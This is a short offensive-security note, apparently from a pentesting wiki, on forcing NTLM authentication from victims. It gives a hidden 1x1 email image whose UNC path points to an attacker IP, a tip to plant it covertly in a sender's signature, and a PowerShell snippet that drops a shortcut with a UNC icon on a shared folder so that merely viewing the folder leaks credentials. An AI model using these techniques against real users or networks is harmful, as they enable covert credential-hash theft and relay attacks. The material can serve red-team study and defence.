# [[Forcing NTLM Authentication]]  
___

## Description:  

#### 1x1 Images in Emails

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body. Â When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

A sneakier means would be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

#### Windows Shortcuts

A Windows shortcut can have multiple properties including a target, working directory and an icon. Â Creating a shortcut with the icon property pointing to a UNC path will trigger an NTLM authentication attempt when it's viewed in Explorer (it doesn't even have to be clicked).

The easiest way to create a shortcut is with PowerShell.

```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```

A good location for these is on publicly readable shares.
